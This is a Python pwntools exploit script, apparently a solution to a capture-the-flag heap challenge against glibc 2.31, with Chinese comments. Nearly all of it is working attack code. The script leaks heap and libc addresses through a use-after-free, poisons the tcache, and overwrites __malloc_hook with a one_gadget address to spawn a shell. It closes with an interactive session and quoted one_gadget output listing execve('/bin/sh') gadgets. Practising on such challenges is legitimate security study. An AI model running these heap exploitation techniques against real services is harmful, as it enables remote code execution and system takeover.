#!/usr/bin/env python3
from pwn import *
from LibcSearcher import *

# 配置
context(os='linux', arch='amd64', log_level='debug')
binary = "./pwn"

# 远程/本地切换
if args.get("REMOTE"):
    io = remote("127.0.0.1", 8080)
else:
    io = process(binary)

# ELF加载
elf = ELF(binary)
libc = ELF("/home/source/tools/glibc-all-in-one//libs/2.31-0ubuntu9_amd64/libc.so.6")

# ========== 常用函数定义 ==========
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num=4096           : io.recv(num)
rl      = lambda                    : io.recvline()
ru      = lambda delims, drop=False : io.recvuntil(delims, drop)
itr     = lambda                    : io.interactive()
uu32    = lambda data               : u32(data.ljust(4, b'\x00'))
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))
leak    = lambda name, addr         : log.success('{} ======== > {:#x}'.format(name, addr))
p       = lambda name,data          : print("{} ======== > {}".format(name,data))

# ========== 常用泄露函数 ==========
l64     = lambda                    : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
l32     = lambda                    : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64_no  = lambda                    : u64(io.recv(6).ljust(8, b'\x00'))
def bug():
  gdb.attach(io)
  pause()
# [+] ============== some Funtion =========== [+]
def add(index,size):
    sla("choice >>",str(1))
    sla(":",str(index))
    sla(":",str(size))

def delete(index):
    sla("choice >>",str(2))
    sla(":",str(index))

def show(index):
    sla("choice >>",str(3))
    sla(":",str(index))
    
def edit(index,size,content):
    sla("choice >>",str(4))
    sla(":",str(index))
    sla(":",str(size))
    sa(":",content)


# ========== Exploit 开始 ==========
def exp():
    for i in range(2):
        add(i,0x78)
    for i in range(2):
        edit(i,0x78,b'a'*0x10)
        delete(i)
    show(1)
    ru(b" ")
    heap_addr = uu64(ru(b"\nDone",drop=True))&0xfffffffff000
    leak("heap_addr",heap_addr)
    
    # [+] ======= to use tcache_p_chunk ==== [+]
    edit(1,0x78,p64(heap_addr))
    add(2,0x78)
    add(3,0x78)
    edit(3,0x78,b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab')
    #edit(3,0x78,p16(0)*(0x28//2)+p16(7))
    bug()
    for i in range(4,8):
        add(i,0x68)
    pay = b'a'*(0x68)+p64(0xe1)
    edit(4,len(pay),pay)
    delete(5)
    show(5)

    libc_base = l64()-0x1ebbe0
    leak("libc_base",libc_base)

    malloc_hook = libc_base+libc.sym.__malloc_hook
    system = libc_base+libc.sym.system
    free_hook = libc_base+libc.sym.__free_hook
    ogg = libc_base+0xe6af1
    leak("malloc_hook",malloc_hook)
    leak("free_hook",free_hook)
    leak("system",system)

    for i in range(9,11):
        add(i,0x78)
    for i in range(9,11):
        edit(9,0x78,b'a'*0x10)
        delete(9)
    pay = b'a'*0x13+p64(ogg)
    edit(9,0x78,p64(malloc_hook-0x13))
    add(11,0x78)
    add(12,0x78)
    edit(12,len(pay),pay)
    add(14,0x10)
    #bug()
exp()
itr()
"""
❯ one_gadget /home/source/tools/glibc-all-in-one//libs/2.31-0ubuntu9_amd64/libc.so.6
0xe6aee execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe6af1 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe6af4 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
"""
